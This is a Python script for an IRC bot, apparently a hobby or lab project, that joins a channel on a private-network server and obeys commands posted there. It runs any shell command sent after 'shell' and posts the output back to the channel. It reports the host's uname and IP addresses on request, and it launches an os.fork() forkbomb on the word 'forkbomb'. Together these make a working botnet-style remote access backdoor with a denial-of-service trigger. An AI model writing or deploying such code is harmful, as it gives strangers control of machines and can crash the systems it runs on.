from irc_class import *
import os
import random
import subprocess

##IRC Configuration
server = "192.168.0.227" #Serveraddress
port = 6667
channel = "#nirvana"
nickname = "Mr_Bot"

irc = IRC()
irc.connect(server, port, channel, nickname)

while 1:
    text = irc.get_response()
    print(text)

#Bot Greeting
    if "PRIVMSG" in text and channel in text and ("Hello" in text or "hello" in text):

       irc.send(channel, 'Hello there!')

#Creating a File at a given absolute address
 #   if "PRIVMSG" in text and channel in text and "touch" in text:
  #      x = text.split("touch ")
   #     open(x[1], "x")
    #    irc.send(channel, "File created: " +x[1])

#Give a Shell command
    if "PRIVMSG" in text and channel in text and "shell" in text:
        x = text.split("shell ")
        cmd = x[1].split(" ")
        cmd = [x.rstrip() for x in cmd]
        print(cmd)
        out = subprocess.check_output(cmd).decode("UTF-8")
        out = out.replace('\n', ' |  | ')       #irc not able to give out multiline messages
        irc.send(channel, "Shell Output: " + out)   #irc message length max 512 characters

    if "PRIVMSG" in text and channel in text and "who are you?" in text:
        output1 = subprocess.check_output(['uname', '-a']).decode("UTF-8")
        output1 = output1.replace('\n', ' |  | ')
        output2 = subprocess.check_output(['hostname', '-I']).decode("UTF-8")
        output2 = output2.replace('\n', ' |  | ')
        irc.send(channel, "I am: " + output1 + " " + output2 )
#Forkbomb
    if "PRIVMSG" in text and channel in text and "forkbomb" in text:
     while True:
        os.fork()

